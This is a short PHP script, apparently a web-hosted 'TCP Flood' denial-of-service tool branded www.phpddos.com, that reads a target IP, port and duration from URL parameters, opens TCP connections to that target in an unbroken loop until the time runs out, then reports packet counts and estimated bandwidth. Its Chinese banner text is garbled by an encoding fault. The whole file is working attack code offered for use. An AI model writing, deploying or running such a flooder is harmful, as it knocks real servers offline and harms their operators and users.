<?php
ini_set("display_errors", "Off");
$packets = 0;
$ip = $_GET['ip'];
$port = $_GET['port'];
set_time_limit(0);
ignore_user_abort(FALSE);
$exec_time = $_GET['time'];
$time = time();
print "״̬ : ����������.....<br>";
$max_time = $time+$exec_time;
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
 
        $fp = fsockopen("tcp://$ip", $port,$errno,$errstr,0);		
}
echo "================================================<br>";
echo "  <font color=blue>www.phpddos.com<br>";
echo "  TCP Flood ģ��<br>";
echo "  ���ߣ�ybhacker<br>";
echo "  ���棺��������й�����,������ȫ�о����ѧ֮��,�����Ը�!</font><br>";
echo "================================================<br><br>";
echo "  ������������<font color=Red><span class=\"text\">".$packets." �����ݰ�</span><br><br></font>";
echo "	������������<font color=Red><span class=\"text\">".round(($packets*65*8)/(1024*1024),2)." Mbps</span><br><br></font>";
echo "  �������ֽڣ�<font color=Red><span class=\"text\">".time('h:i:s')." �ֽ�</span><br><br></font>";
echo "Packet complete at ".time('h:i:s')." with $packets (" .round(($packets*65*8)/(1024*1024),2). " Mbps) packets averaging ". round($packets/$exec_time, 2) . " packets/s \n";
?>